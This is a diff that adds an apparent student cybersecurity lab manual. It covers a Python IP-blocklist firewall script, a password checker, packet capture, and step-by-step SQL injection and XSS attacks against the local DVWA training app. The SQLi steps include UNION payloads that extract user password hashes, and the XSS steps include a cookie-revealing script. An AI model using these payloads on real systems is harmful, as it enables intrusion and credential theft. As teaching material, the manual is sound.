@@ -1,0 +1,272 @@
+Experiment-1(python firewall)
+
+Step 1: Create Python File
+File name: firewall.py
+------------------------------------------------
+
+import requests
+import csv
+import subprocess
+
+response = requests.get(
+    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+).text
+
+# Delete old firewall rule
+rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+subprocess.run(["PowerShell", "-Command", rule])
+
+mycsv = csv.reader(
+    filter(lambda x: not x.startswith("#"), response.splitlines())
+)
+
+for row in mycsv:
+    ip = row[1]
+    if ip != "dst_ip":
+        print("Blocking:", ip)
+        rule = (
+            "netsh advfirewall firewall add rule "
+            "name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
+        )
+        subprocess.run(["PowerShell", "-Command", rule])
+
+------------------------------------------------
+
+Step 2: Run Program
+Open CMD as Administrator:
+cd Desktop
+python firewall.py
+
+----------------------------------------------------------------------------
+
+Experiment-2(password strength)
+
+import re
+
+def check_password_strength(password):
+    if len(password) < 8:
+        return "Weak: Minimum 8 characters required."
+
+    if not any(char.isdigit() for char in password):
+        return "Weak: Add at least one digit."
+
+    if not any(char.isupper() for char in password):
+        return "Weak: Add uppercase letter."
+
+    if not any(char.islower() for char in password):
+        return "Weak: Add lowercase letter."
+
+    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+        return "Medium: Add special character."
+
+    return "Strong Password"
+
+while True:
+    pwd = input("Enter password (type exit to quit): ")
+    if pwd.lower() == "exit":
+        break
+    print(check_password_strength(pwd))
+
+-------------------------------------------------------------------------------------
+
+Experiment-3(packet sniffing)
+
+
+1️⃣ Start HTTP Server
+
+Open Terminal:
+python3 -m http.server 8080
+
+Leave this terminal running.
+
+🔹 2️⃣ Start Packet Capture (New Terminal)
+
+Open another terminal:
+sudo tcpdump -i any -w capture.pcap port 8080
+Enter your Kali password if asked.
+Leave this running.
+
+🔹 3️⃣ Generate Traffic
+
+Open Firefox and go to:
+http://localhost:8080
+Refresh the page 5–6 times.
+
+🔹 4️⃣ Stop Packet Capture
+Go back to tcpdump terminal and press:
+Ctrl + C
+
+🔹 5️⃣ Verify Capture File
+ls
+You should see:
+capture.pcap
+
+🔹 6️⃣ Open in Wireshark
+wireshark capture.pcap
+
+🔹 7️⃣ Apply Display Filter in Wireshark
+In the top filter bar:
+http
+Press Enter.
+
+
+----------------------------------------------------------------------------------------
+
+Experiment-4(SQL injection)
+
+
+START DVWA USING KALI OR with docker : docker run -rm -it -p 80:80 vulnerables/web-dvwa
+localhost:80
+Step 1: Navigate to SQL Injection Module
+DVWA → Vulnerabilities → SQL Injection
+
+Step 2: Normal Input
+Enter:
+1
+
+Displays user details normally.
+
+Step 3: Authentication Bypass
+Enter:
+1' OR '1'='1
+
+Result:
+All user records displayed.
+
+Step 4: Find Number of Columns
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+Stop when error occurs.
+Last successful number = total columns.
+
+Step 5: UNION Based Injection
+1' UNION SELECT 1,2-- -
+
+Step 6: Extract Database Name
+1' UNION SELECT database(),2-- -
+
+Step 7: Extract Table Names
+1' UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema=database()-- -
+
+Step 8: Extract Column Names
+1' UNION SELECT column_name,2
+FROM information_schema.columns
+WHERE table_name='users'-- -
+
+Step 9: Extract Username & Password
+1' UNION SELECT user,password FROM users-- -
+
+Passwords appear as hashes.
+
+
+----------------------------------------------------------------------------
+
+
+Experiment-5(XSS vulnerabilities):
+
+START DVWA USING KALI OR with docker : docker run -rm -it -p 80:80 vulnerables/web-dvwa
+localhost:80
+
+Step 1: Start DVWA Services
+
+Open terminal:
+
+sudo service apache2 start
+sudo service mysql start
+
+Open browser and go to:
+http://localhost/dvwa
+
+Login:
+Username: admin
+Password: password
+
+Click DVWA Security → Set level to LOW → Submit.
+
+
+Step 2: Reflected XSS Test
+
+
+Go to:
+DVWA → XSS (Reflected)
+
+In the input box, type:
+
+<script>alert('XSS')</script>
+
+Click Submit.
+
+Output:
+Popup alert appears → XSS vulnerability confirmed.
+
+
+Step 3: Stored XSS Test
+
+
+Go to:
+DVWA → XSS (Stored)
+
+Fill the form:
+
+Name:
+<h1>Hacked</h1>
+
+Message:
+<script>alert('Stored XSS')</script>
+
+Click Sign Guestbook.
+
+Refresh page.
+
+Observation:
+Popup appears every time page loads →
+Stored XSS successful.
+
+
+Step 4: DOM Based XSS Test
+
+Go to:
+DVWA → XSS (DOM)
+
+In the URL bar add:
+
+#<script>alert('DOM XSS')</script>
+
+Press Enter.
+
+Observation:
+Popup alert appears →
+DOM Based XSS successful.
+
+
+Step 5: Capture Cookie (Lab Demonstration)
+
+
+In Stored XSS Message box enter:
+
+<script>alert(document.cookie)</script>
+
+Observation:
+Session cookie (PHPSESSID) is displayed.
+Demonstrates session theft possibility.
+
+
+Step 6: Change Security Level
+
+Go to:
+DVWA Security → Set level to:
+
+• Medium
+• High
+
+Repeat same payloads.
+
+Observation:
+Filtering blocks scripts at higher security levels.
+
+
+---------------------------------------------------
